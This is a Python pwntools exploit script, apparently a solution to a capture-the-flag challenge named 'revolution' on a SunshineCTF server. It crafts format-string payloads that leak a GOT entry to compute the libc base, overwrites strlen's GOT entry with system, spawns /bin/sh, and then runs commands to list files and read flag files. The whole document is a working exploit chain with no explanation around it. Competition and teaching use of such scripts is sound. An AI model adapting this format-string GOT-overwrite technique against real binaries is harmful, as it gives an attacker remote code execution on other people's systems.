from pwn import *
import sys
context.arch='amd64'
context.log_level='info'

def build_leak(N, addr, ch=b'A'):
    d=b"%"+str(N).encode()+b"$s"
    D=8*(N-6)
    return d+ch*(D-len(d))+p64(addr)

def build_write(N, addr, val, ch=b'B'):
    d=b"%"+str(N).encode()+b"$w"
    D=8*(N-6)
    return d+ch*(D-len(d))+p64(addr)+p64(val)

def run(io, write_off, system_off, binsh_off):
    io.recvuntil(b"score> ")
    # 1. leak write@got
    io.send(build_leak(8,0x404000)+b"\n")
    data=io.recvuntil(b"\nscore> ")
    body=data[:data.index(b"\nscore> ")]
    leak=u64(body[:6].ljust(8,b"\x00"))
    base=leak-write_off
    log.info("write@got = %#x  base = %#x"%(leak,base))
    # 2. overwrite strlen@got with system
    io.send(build_write(8,0x404008,base+system_off)+b"\n")
    data=io.recvuntil(b"\nscore> ")
    log.info("write resp: %r"%data)
    # 3. trigger system("/bin/sh")
    io.send(build_leak(8,base+binsh_off)+b"\n")
    time.sleep(0.5)
    io.sendline(b"echo PWNED; id; ls -la; cat flag* 2>/dev/null; cat /flag* 2>/dev/null")
    time.sleep(1.0)
    try:
        out=io.recvrepeat(2)
    except Exception as e:
        out=b""
    print(out.decode('latin1'))
    return io

if __name__=="__main__":
    mode=sys.argv[1] if len(sys.argv)>1 else "remote"
    if mode=="local":
        io=process(['/challenge/distfiles/revolution'])
        run(io, 0x1149c0, 0x50d70, 0x1d8678)
        io.interactive()
    else:
        io=remote("chal.sunshinectf.games",26002)
        run(io, 0x11c560, 0x58740, 0x1cb42f)
        io.interactive()
